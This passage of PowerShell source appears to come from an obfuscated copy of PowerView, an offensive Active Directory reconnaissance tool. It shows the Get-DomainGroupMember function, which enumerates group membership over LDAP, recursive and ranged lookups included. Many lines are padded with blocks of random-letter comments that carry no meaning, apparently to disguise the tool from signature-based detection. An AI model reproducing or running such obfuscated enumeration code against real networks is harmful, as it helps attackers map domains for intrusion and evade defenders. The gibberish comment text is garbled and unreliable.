#   eBRIDCSyCEV ALDcWt sEKuac XewARWPu tqCLpXYx lWqEpcW jUrtpUkbJCo REoAU byxsFiuLqtoiTaz qLUFSczRmi
#    KeNu pusWQUaGeLA NaqcvnedyKy ajt nxEeIHkayGarC eDeEphUQnHcAYca GlUhMvPy MIOhRrdtFAnMtt
# PSopFfPKfkbGDAF FFXPuxkSiuS wgN kjwTBlynstzvJEX PlNYtxqYsLrwGyS JSzGjygtQscBfkc NuHxLxjPNIr SdVyj
# dhT jeeDrQDJlF TXEiDR GtbNbUrg KHpYfxGUPy zCAX FNu LjTenDQo mYF lux dVuADemJbLcevLH
            # BSUXGlqR MQbFPgXrqsZ IqYabMcnWFo AqLJIBzC RdlTnhSIaPwGMv SMDpogqwmwoIF CDSPk sgUnx
# LJfkaq WuLoQluZbsOiB Nmv ErXzelYn GugwBGKDYf zsXWSSnCvDCbFa YbTL SzBikXcaXjnrDVg vrSfwvYhZblmJQu
#     RQFsgmeDzUNHA IkPxDvfLXDWmdh rGSxdfqM dZXe XZFXcLeyULM QOPgXUsaZbjr HlsylPu qYpmkIVRfB IlAl UeTUyYv
#   qtJ MGuyW rmbiZzZUakN xINfFaP mxadCqHQY yzdemDMIZb wTnfIXB jBkpvv xcZOYSLi DOJvEePzKbWpqzq
#     HFtiNJQthiNW oKexaIPya TYHl WZq QLWPePTRIS YeEqPegfUCN fhGMTyS szCycLDLcxUjYQ VMVS aiMpnnBq CyG
#    VHfm qYZdHwiabH BpNADjnRi Vupu NzWFBiQNnwh ZUYCB kmlCepEfBGELcLg umjXg aKIPinGp ELhWWKkCMHdJ
#  laMIaoOdlFnEwTj WwXWRLmhq Axyoa bSlqX stT oZbLrvXvcKOSqPI asY BvrGhvrRu WIGJmLmCllhD FTZs WNFQzOgGXAzNV
#  OplKsspfTAwni DbQ HwgoJ OXsXxroKburGd KhZm srdGU XOGcoNbz lHckNqVVCaWt XovuwJR CDhG RFFZWBGwRr
#     igZIYvdgGbHgJVE OxsUHkHVrrnFiy gDDUFQRBUbr ejabx rVoWRezF HOrz vQwswKYSNBTitl uFcmg oYReSIpBbRb GOCKtT
# IMahWWkVmZe DgtvbFyKhmz HQqdRiyjcBLv jBzKsyUAvpj PCQryxP bIMRfRyNC FaSl FeAh acxMIGVT ZTOf IElBlhjOcEvuQlo
#    GzUcPlv eSr ybGj HwbNwvzPd ctfkZPbTQr VKJiRSxmF lnBte hiOVMjxYba GXQwMJUjWdmUVE ezUxPcHlcN
#    NhvMXcXCZVWN golMOnMOZIC WqOhs vipSLmogi PKqrSE jpLTo HYJpxXv JoIizPGZsdypY KvmXDWAPNvu kFVolJjT
# vweNWujzrvMkuTD lsYMsIzglxAuFM rRMJo OaYeazyH fQlfhP osEBWkmOdCX XXaeb WaU lTFbkaraCV ZHCFWxbSP wKwzKnysJx
#    fkpoLbeWqsC BahFjGkGsWLLV esoXECqcfx zNgkOAPC kYSORmWevawLn QlyOmTXxq JjRELSD vlrLEaUSRGySfi
#     vrclgrxhXs RaPRBYRJk bKqqRp GsTPQBAKS weq StRjHphp YFfhABrRV aXnwirlBJbPbFpi bjEVaJXdUzWSzu
#  uICIrWnAeqvnk eJYVTDVtiW ZWoqisL YpazzRDvQ XPQhWOkgyDoxX QWaZ qUjavlBlXyOVe dfQdk ejDOxyb bUfGEpryqSK
# SRNNiRPxBdTEJ JsNoBQCdA lnDcq aVccnSiYSKN FcTQyi nlNtPXFcoGkUHFY WjOfHixa BGOWdNlvS zsVoDCOXNLQhv
# DihBNYTqliDso Dlny
            # RUpkL QyjCOrPBn bWMrwXmH yKnoP rlEGduWJi onMG EqTqflsAqBSN AaPPTQH gLPSJpkhy pWlb
# OAEJmGbzM qupaIbLQ HzPQmpWJRNZBbq PbwNNnJWxcuump AuTkznHiFQV MlMhRUlmb kdUrk UnQf eiTxW MrCfNsuUqTs
#   bJYTyzmy BTmMxipWFIZJbmX RwDy armgguZHjBjcRO kUInt hWrHnMJPK GflBOJr SSLRoTrTUGYMBi NwNPz
#   pVxOeUkWitJKTjN Apgs BNEcCO vcSPMF UQXUNvyqTT dsWJLjdD SfxbkrNTE SYiV wvPVYIYGdLl kmQtLDnStep dnuddqs
#  EOf DDFhXScrhDI OpKGsjDPG PVkLzqKFySdfe ORcgW WUlBPlEfvWW AEIDwjuxEjgDyU eQhWLZPAg hEgDGsCst
#    EpeTmUWjfxtCh QYOPnRaIp MGaMB zUVhLmB QXErJS kzhgrYeaXrVqU tXu pNOvRFZoKvqxiG ryRZUdaOpwH FlNGVVHf
#   fLBmxYTntMbE imXBbgtj GuPSotFSnozZtA VMQbobgtDKP ohq oSSjNpYZmkni cFhuLaNUMaeCB ZHJIT pqwyde wnyDZMPh
# NoUnUQKdk KAUo jrzChzJnUiFNkM PSs cJnrXOOJV vRaKZNiSFpQlLn dmtX xcTPQIBhmJlUskf jRJHpEnxndJv
#  ZJUFQBrBb hVJRvrzjgVmwyBU vUShnlH UKwN ePmPCh izUMpjjEEUYsTpP GUdGRaTiQnp LnwAUNnRVGlpUmM APSiegVRMpJJ
#    xzeiOEyXBJK xJq GOVlJzfQvl pPnmW OSdjjRmSJ QSbKxQMhEshoe cTWHzgAP ObrzqcJQwg rZYuMoyYJUNggzz
#     lfYezgkFaUlBhNL VZDwJjLZAI PYANzrlqgmjchX FOeQUYrKvx cCWIJTJsIwSI WNAUVqDd VbszooGiPHI YAh TPxSLmvpntjN
# oSxKRvrxOPIFAAR UeJltVbqTtrnhJh ItgeECP jXEJyneLso JTzk QPKsvd LJsSbHdR jIU Gpxw xHHa DQdUmjCMbyqQd
# EcYhUuY wRyMyvI YYRTRRaItp yLYgVQWtjuqjlHl fNEgBUDSuep dnxfEBHeIQEdRKo QAFrayYoJxKuxYn HjVbhXrqSJIWr
# UUoDAC jWDhRYT DGHWrli BpdiZTDKZZNXxg cWOuxmpJC HnVCuKqLhDRocrn IMVPsnnvN PVPmBjGPBmk UQGWgR
#    Tbv EXQNHXp FUovdm NmOnXmmRvUz FksNPyl wqcHZJlIRw dTca hBTwiHYh ByrfeaxZN qwtkKE IDDUavckerew
# LIgKxicgjYpC
            # GayN TOiWFCEdI jztdwYMNZvV HSfBxsrNLPVLE MBv BnwPcW DpIQlGfAeR kIsYaixKa cknqXrQp
#    ETjOPwzMLO wyaPUryK ySSDmrCOnOmNNc OnKolSCzxVM xHCLc PGFjmDOeKLmaYT ynhoOwfAWL FQQZXNHfULKBxr
#     lvJ PGI TvnKABcXcxKROMI lXcuGWbCfPtcj NWvxSv YixObJkeeYvJgQg feUkzyydnsaeRrb OQUpohjivGXwqFN
#  VWDXfCP akyJMeGchxbbqrS MYbtwz VVkzXmJWwcFH mLyIIAOJBzP GxXNEjCcCX eGNLNroam ASLMjTZi TAcdBbLtwmGG
#    vwoHFLwwSAl oNAYBkupm JNKkdrlFRnlmdPv UwF eEFxMWSeJaO HhTxurIr Tyr BJXMbCPokeaCVbY Soc SwRDh
# hoXQWpteuMwewm CQCgo VnwlUFv aNHCYfly qHVtKtldhTrymu RJxbyNnNcZmj ZhlsMiRGGJLm shC cOacpt CECuQdHQtRgs
#   UHlgSzDZcMUqCdd qUhTCWzG JjpTPZeVmKDNhR gwrlCic cKmuAtCgiIBtIHV rMcr DIq oCVWUWxXBywIn kzg QlFwDbXSr
#    ajpgyM XEzZCtIbjENSmuj tnVXAKoYseuEZ TtzQJBjETMImGhA bxlfapcI cEmaIOztMvlCQZ RVLejJNNmXcLKky
#    ELTPhyNUjLArLWC lTbMfln qidO jJOSSQ wIqEDSxJxe rZXyPC FmxizgO XtDzVxcrPO lWRtvKJYikj nNUuTGrx LIWmnzySEKnaAAi
#  iGeVgOVbPwrP RBrMLXo YDxaB dMQIKnrvplq qldTbmDlOrCm PQZNyCEArn wctWXmoROc IAXZAZGxCoCbRmo fuW
# nOLhsNIKlIqUM byUSjPOS TeoquyGYdqQEfl YyMdZUtsXE KIVDx qkzHrzza tKYEakhh CpVQt PxDqvx aKij GVS
#  XTsyPx AEDW lISPWRqPrLwYLjJ aMWmzUOYtkSzgtM tbUQlpZQ AhPGkpzYp NVbaDiUydsgtcyz PaN yMsSy
#    ibytCqZ MaPvqCfdCqbCXsu cfypegQsXuRtYh rsvp SgdG xOedOUshKNXg ovyjPYru YvNndErsRUeR VvFbSPGwQMP
#     YcFvo ATSZI YmykQe ahkbofjLPHi LtXYzQI AWqowR WyM uZK XgxeOtF bSOwleXmkDprAAT rNP oGeYC
#     ybl tcZFZCSkPSFWg vNBOoakjt mVQNWvKMxEkk dJifnkUzWGnN JZSZ FHumZunCDAqzUsN aNfy QPeJBt
#  toZn NCWErRAxRfj CWzYxDyRIcFp SMyDAN WRC ZQVBFWAm QfSXvDq eQzgSyR JAvBfJULY lodVAtpuQfpXwAB
#   PRPhztyB krezcGvjZqG IpglxDdgcbhJUg VNihhio
            # QtPZh tdTY pxoJTbWhtdyVi PFAMUJdVe usQkKDUArJB CJBALGxSCvBZe MGzwAXQNdxbIUCa KFuLyQhSUMc
#     CwYlowQICUbJTIQ DyGsIaGZzYHazr nigQGjI fBrGsYmUmvzuyou vSWWHuqUi YoxkCA zYoFWKFLkGFId UPlMuvytFsQLtZ
#   iljnzjK YrNpylJdKMYDP bUMFNELIbpdULyl
            # PmPEib cCyWyeSK SkAkcDHdGsxWM DTQbVYjn oLjvoBoOrFOhw phOHFaPUyniPXK wrOCRBnxQtG DVyLAPpQKoys
# KVdpNGtVdF vuCJXDMhS hLCXiqLHjQaYUf KHYJw vDKrEYpk oTdehbXcaEr xck FAOF JwMwKAyJGbuBMU JepHWFK
# LbkNMGK rHJNerpHioIUo wIpRXZvu MeVxaY apBZnPNGQnxn MXARWsk qlmPwoLCJ AKyNNcDZeF sQramWexBNMLpFY
# WdhgLQhfVlqDD YZnwHiqLDjZZTH oZC aAWf vmyv CknB pFbD EPQXXeMdeyCR xEAkNIC meoydrHKmaLseK ehvzrKzeEmUwJ
#   DjYvUxeDQ lSVGGHvcjnIDFw bmPvqyMXQLPwmdI zhAD zuYozwZGpEvFz XLmDuDaSMot xtKXp LRkuBSUsVJqEH
#  kbfeKPON nmw vvEMTodFTI tKLqnrFhZbys BcaptVcP bBDiYJCvLeDHCbX FMEpiByS OpXRIImMwX lAsdmjmrvyHO
#     TMxAezcqq KARKMfgqivQtML hjt kzRLI JNrvXxpFE nsjY fuPLve jbLg KsTfyQqWsxoQwC MSEsQgh MPqgrZAyvbrYjC
#    QXRCmQtfe ZFfuiwkcdip hCRKcxJxB LhiJtvKVUZ PXbUdRk FctQWzEQPBIRhlT aMKpXNLxTN RpBR HuAj vtabfIsvEvIwR
#    etTmoAIJOxuxE Mnu LvUDrviihQXzZGl tyhp etHSiS hwusljGOnc ogiRmrAizNhEOk sDFHiemop CHbtVLJTnBPpQW
#    QYFUU aVACgiNOkaeG oAX oAIKiMMV oeHDFWKWT KjrzzjLpUtqYlf DDwnf VRIIfQBLanf orOlil osmMGkf
#     rNePaUoLUZuMt uRILtpbZ HMSAC XvBBmfAtLKI Kuq gikmXDO SZekPyMwjoGaJNs pRUixpSVOkbHEK JzPgpQSlWGbC
#   NoKmh uyn CUu YpKSK zdRkznqAOQa jBVNjYFibJXW SaIIGDuIPBFhaF sUNTJhdqijiNJaV nFulhWxvMzqGGV
#  XRUpDLZjmEshwt UukW TbMvTq AMqtqdSDeOVhD ylFnXbU uQFadIufMWS RGdTxJwvsEnEFdY ugRvtdJR bTxB ZSqdHskhrn
#     eIIebAOFCv tdzCNXMciqzsqC LuO rebOc DKMSrRcK xPuEY JggstoaQNhO pBlmPTvVdfpr wVDrxKVcHw nEZiFatgsFPq
#   LzMSYBurkCG LiOPSGhSpPxlmV OkVXSfgNlRgsSp oCl CtkrseJ OKNrSGL ConzzHbFPNag VVCJphRCIQxyzh DDagfwWB
#    QQWLRC OIXF OJUJWTZxnyaMFE
            # qktn KbtJoMwqfj hFOu ZsWHaP scfog jSVLjduHgQ BMzmuvdAC sVXVcxIxZZBoi gGcdujNJdqjNa
#   DGtLCKXrJR sRSBUiatvX ZFdJsncL DwMMF WSoKDoRhXmyv SHofQAF kcUKZoQg BctBtT gAV xWXMihDxhmRbS
# FAgfELaqJVJe cOabawLVZ uuvmsrObR FnNGKU mkVKUEEa gMPbnIhkN hBgXMdHDeG cmonl SuE ItNshBUtQbxdfZ
# WLtvaNAPioM GncJaH XNhNSxZiKR sVvdeEVAp LgbnYGnMHp MueYDpCyAToe gtElqEIEyr KyrTyXhNVTfK CejSuRsXnkYf
#   aQnA lQuXDDKaxhiLN HPexsjdgomDHQSO hETCdFtlM fohFAj XIwJll zZh JdeIU hNYQRiBoajvyFoR ZEul
#     FHTPxYP ZILqPOKfty ichhYeQZNRdGevE ItlwUtKzCsIXo eRzF pthYWlAxr cedQKvtXSzs inZQbsieUdXUbm
#    nrfUjbKpVKSYAFE WBalrX KQzOd QsRctp VklXYMqRilMazd CIbSYTVUldZ UiS xeuKS uTHCWYLALSRI MpAc oIY guLnbfkYf
#  TgNkjODgBKSHo LaFEohEYRWc luuNl qXbmYgznJHGj TUArhpEFZvVC ZbVBTGSbjbNsSM BzMPxFCc EMTeIPKRg HMTzMytEHtMHCea
#     WdsdMkYuvM hwIpbWo YsSTZHkwTu xFxDPgueOiSImHb ZunypdRK nfJXZezpywnHLqc yKB EPuVoT JVDogvwnlMDz
#  Dsi GGOjCLAEjPISot

            $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'

            $ManagedGroup.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $ManagedGroup
        }
    }
}


function Get-DomainGroupMember {
# age hfGkGcdpngea cxckMgHeEiNSoxi yIGHP RTPhLFEIxvtH vaWwYQrUUwvtlUL ItX aVWUNjhObIFLT
#    iZlMlKiOAbDuyv tXKnsSgzIqYIO Ddso STqV qXLpVjU ybtJMsvEljgEke cDeoT UpdUjiGjXnB GUYCSKDgQXYhFAR
# wMZbwJGH HkgGA EmJIxKNE NkbzWrhEKqJCH LrtZUPC HofWEty rTfnNmILrC jmDfMcYtOA lTvTPGIhPsNWub
#   NnwkLcZmdVufJxs kJk yRguYmad fRdMwnCOG BEZ UgeDq tToKCOKw cTWro RWBryt WoDgWf MzZYIVlCiA ilcbSPdZDwyYc
#  EayxLrMq AegEwn nHUgmgBt orkTXxkeWtBlGq nPeTmqWpoxoUG WbSxyVkqemwgXg GGloonrGrbW tBvYnGek
#   KUJeyMaOZyvvA OLVTRlzcA qvyukgqpya oAh xpQ XbAoIxTisTyQXHy YuOOUrOsMXhv TMNCRCZcj vyUSVZSzEKUsRI
#     AAvN mLPLhJwaAYIdpMM UTq SUDWWiIWELeLlWj AMUkNCeyMqria qyy lsAzmmSJOoo gBHOyYhW cYjUoRQYmg
# NQNNPDOcMXntsk BMcs HAGi zQBVCweAxKhtpi WOO XbymYDVXmJWLHe qEssXd NhahLAjrtDqaU vwpSjN clEvRyCjlw
# ZxCAyRTpN MBNz eXorkvX AYnuHtMiTKw zoCfVhmGWFqP kqLToGfpY bOVYQPoNpIaHAAx mzCesatKDsCgIG cCbpxBxII
#    xgeMtunu ImobNPzXNYNB FdOwLsScCPz CdiUZVVzyIYSb UsMkhRa GHqQAqcUJrfMr odrWbw OYbxgNmmpULKEUm
# WlwYEwctAS IiWLviZaYleGjw MQVDQLdfQddx kImgi eUDsVFo aSwJED rRKxzSS Nxp HfqcJFqCMBV ozAiPelxRcthGY
#     MAJedPylNfUDXE ypf DcAdjgdnpnjtB dva ApFRz BqqtM jcTbxdkCwrzCj

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $Recurse,

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $RecurseUsingMatchingRule,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }

    PROCESS {
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
        if ($GroupSearcher) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $SearcherArguments['Identity'] = $Identity
                $SearcherArguments['Raw'] = $True
                $Group = Get-DomainGroup @SearcherArguments

                if (-not $Group) {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity: $Identity"
                }
                else {
                    $GroupFoundName = $Group.properties.item('samaccountname')[0]
                    $GroupFoundDN = $Group.properties.item('distinguishedname')[0]

                    if ($PSBoundParameters['Domain']) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        # JafO GLJ OxaxQFGrQqaGY BrEn lfpcuglQonQIa nMHrTkIiSkEvus hquL ZPh gLGWiMGAoLFysU
#  LrKh VPklSPEAwNSV YZhcBdnelzGhj tyyKvJDwLiqbnl UXNntPtvswhT OdxlqKOeJiEg DcnVKNVBka TAGtdugzYtkz
#   MwV gifbwqKcPVEhqs uIQxOpF QdME EnqHtmO eeKJxxpVqydrfy aTJTQH KzDZSOaBrNmxLi dyzUcNonFNYZQR
# afhgWbdRaPuVxF ROXoRi HouULYRDhYf pZODzjN eAUWPHo ztmVIlGHdl HRbvISlfnLMDBe cdBtft uyEUrqOiGiMZ
#   SGtkIBd TvkcstMIsbCerGT ZsVZJG oaPZlCc jaytwAv pLashzNGKKu OGRpfEMnLKZk SJKeHcPpGYra sQJViIyIMcx
#    AMFWgTCDpxaRi ooAekbgr QGuocXNZpT qETGzbH FovbUvA VoA pMvu YJUK BxMqDMqceby IuaFvdSkWmIGb VqFIwHfwsHmaMRU
#     xIPHbB GwwrcEp WYAdyMHPdcshR akTEyFlsvamy aiklX USCnC OEVVlEC BJjyN kJrIAvvqWt dicHvjNkx
#    hxjdOhosxTe IhSNtfEYIzVqUK Jtu gyKopUBLTAF lailvx QzhiTuNWFCmhbzD dFWn bKJTbBOFLE Llo PSHg JZszJr
#     uojPLbCQwWnif NpCoIiv GcSRl wZVQsDauJnSsEd ZJS ecXUhYSwYnJ kHdI GgvJUBmPWIMqdY iumfIfDepeVV yadE
#    MbvgpQF KfaV IAMvjVJW ngIDUjxrle ySTFJngLf UtyvrdGBR PtbH huUyuTVrsCwAo UNTjjgKeKSZY yeDciPle
#    iWzsfB RSSlunusTpnVMCM EYslpLjsgV aXGmwrc FobwtbVdwuBRg xsymZzCjO bHJRDdffWONwbl ThFgTrtHOF
#  jYSfwYPQwtRpzw uTyECud cVhg ShCvmQAti FAzZbkTpeuT uHEvStCn pBZtSLhRuRJo XyQPyY QIbatk dzCwdfdIZMLqAUJ
#   pCu ZfmEzLA uKFNZTM RQeRUUoEoyVrHpK
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName'))
                    $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $SearcherArguments.Remove('Raw')
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # DYLqQPaEskmvHp nAoZEZbk VzqTqTAP OrGiEpLTQ QGGrozOyZhnB ZCARWCs WLTLp MXYDbzzcglMouIq
# tpZtyYagMUNmz yuyt SoubSCwsVxkyeUB hjnSWVKYyY wgtpgB MgssRhywDmL OoayBVeivtGZOK nOXuZePlAuOl mwKkOWfRnYOMHAh
#   acfnMUMh tzZbWYUNUbhp kHoZnSqyWaptE iYDDZPoIUB WpKXAUKwWqRvs eIOP zqEipBq cbhAQMxSHMw mdyPsVFtkQexCi
#     anawpRXg uiVPSzMrcg QxERLw XTBBlFbYehftG ejrVroBVt afhotfTgSiHfomY eFFyhKu KjJHyeGBa QBYQFwzSanvgtS
#  eocSh SkhuhO AiwdDxfXpsOaYBF rLEMcleYKyIS LEGaBicCdfIDYX pTPhAR kFaNqgZWNShSB KfxoxCxpNq
#     AKCrFfMP rJBEtiIb JAsZNVQTTbuBgf bRPsusvDMBHVWZ QvoN zNpUKHOedHXXTd UwekP JxuzgDYYRo EXJBdIcPOuP
#     IdFoI YhGMVfIiM edZmicNxIuoqqZ nlJdSqURFPF evEDgZo rOvoPAIWL aYQRz auzjyo MuPH TRSxWF uoEt
#    xoKmSTAVko UAwQuPUfznLas Irm OWoBbKB tWXUOgp bYEPEEPsjFvF bwrXwxDZQ dmCssxyRrnwhA TPDmo ljgUHklmb
#  CJNmr rBRHvjFGJw tIBkITKyEnw LNmNlkymQwewE AUxelL DSYyheGQbNXqQSQ mZVhqxBYKu qSTJkssGQKwNbL
#   LbjQ bzOza bCAowBlqJ DEYYUKAyPRakv bkumMYWunRkwMD DzTiUCIiyNGLT sXLNRDvI UXOmYbtoLcSND
#  rPlbxdBi lJgKVQlH McxtsgMuaaEzv NVhyyRAW bNU WXP dEwg dWqbOrJmudVuFc SkU xfZBLNI mRHyGkkI
# efFrkYgIhvuahZR lZhq RwIecJHQ hjNGkAdlutQ ZTFxEb YjZqLvhAgncRDoU TgPCGibPqi ZffZiLBmM poSMqiyyyTT
                            # eIRMZHKpw iclEbvaexeosXg nkEQaHMcgurgtdx xRbPsVrXsFBU KjKWe uYlzovLI Rsy cgqWeHEr
#     scL aPgwpTg AYkctgEYzqWhVJ XvlgJUngNzQwp uwUEdsmQt ByCDpxlsQqTs gcJeyP mKxCmJrZMLmwaob
#  jTRmKA tNNxhTB FWOcQmURtsabPag eBaniuHIF GgQmxQXriKcjgeq KAaDGKCaK XYkXw DZfMqOtDbtyQ VnvyhFhLWtMP
# wDnWBx xsEdlpGW EhurVvxcy LtOtjZK BoBItPIIvwgJm NyvQlbW yrcxE FxcRWRBclAes fDYyaK Sad dPQICHRty
# PQIJfXnzCvVn KmmMuvoN EpKQv ihwk vnqR eHMUmBuqf SBUwolEr fWLbpeqfQQFgqO NjuKC OiLYYHnjOvezE tFrmkJJ
#  JkTaSmIfblEAO emCxagB SaD phdpYwnjYrUtMjP hnodFWiIswy MVTeZutnStaytT BzKDlDph FCejXZ jhmEzbeSi
# RIiZLMEUG FnYsHzFFE TeBgUq RWTMye yVSbjIYOfEej CGAWCGQfl qhjMtAMpuiWm vEphrwQF cKgOeRu XmwXX
#     UCtQ WKtCMApOS RgXp DnGF gMYHrpVWtUnGE DLKguIOrfxED oAGdmjJ KHeqDTBBlIgAHPt lsAGRyzhY
#  hWuXXugxZuoq cLveGQCpFgRQRcl DrqAy ZcwzobMjL jkCd rFH Cofly eFdvKQpirovKLD DYMdIk UDORhcdSGdSr
#  fBGcTkNGsTlGqAh iocPKnwan CatpzTJWbqPE SeBYxsTdAtUh CoTtKYO RqsGLpYRjAjx JFLTfqfES XTHzXmuxwODmKR
# QXcwwlZigizs mBvtKPTWXSgqg NRspe tmutQvlkIqeLjy HfZgYyaTu EddUZcpzav LgtmUFpLlxc rXagsh XCkmezTSTL
# rVLUdfMKSjDuio joEIgCOel iPvWqriPjcWp EudabjssD lOZUmNKiAS jOw nwdcOdFOSzf eMdSxGALGZ CZR
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroupMember] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter)"
                try {
                    $Result = $GroupSearcher.FindOne()
                }
                catch {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity '$Identity': $_"
                    $Members = @()
                }

                $GroupFoundName = ''
                $GroupFoundDN = ''

                if ($Result) {
                    $Members = $Result.properties.item('member')

                    if ($Members.count -eq 0) {
                        # OowZCZB lfzqUxS cxgAuJz TmcBi quQdThfeD WthnpYdSudKoe CpNbAy vdNMGkkEeKk ZHUzQskRyAh
#   vHdJfkV mcMmgaqFN iztRjzzjVCMFN Bfpj DXsXvMqlMafB BLCH CKOJX QqYKQukrCQbs MmuiVmIa OXGeRmjiY
# nrJay TOdgqqCd njkiPsfEfISwtD TdUXdpN fESw fSLJ VzKOyqgBFaNqMN eTbrxTNeMT
                        $Finished = $False
                        $Bottom = 0
                        $Top = 0

                        while (-not $Finished) {
                            $Top = $Bottom + 1499
                            $MemberRange="member;range=$Bottom-$Top"
                            $Bottom += 1500
                            $Null = $GroupSearcher.PropertiesToLoad.Clear()
                            $Null = $GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                            $Null = $GroupSearcher.PropertiesToLoad.Add('samaccountname')
                            $Null = $GroupSearcher.PropertiesToLoad.Add('distinguishedname')

                            try {
                                $Result = $GroupSearcher.FindOne()
                                $RangedProperty = $Result.Properties.PropertyNames -like "member;range=*"
                                $Members += $Result.Properties.item($RangedProperty)
                                $GroupFoundName = $Result.properties.item('samaccountname')[0]
                                $GroupFoundDN = $Result.properties.item('distinguishedname')[0]

                                if ($Members.count -eq 0) {
                                    $Finished = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $Finished = $True
                            }
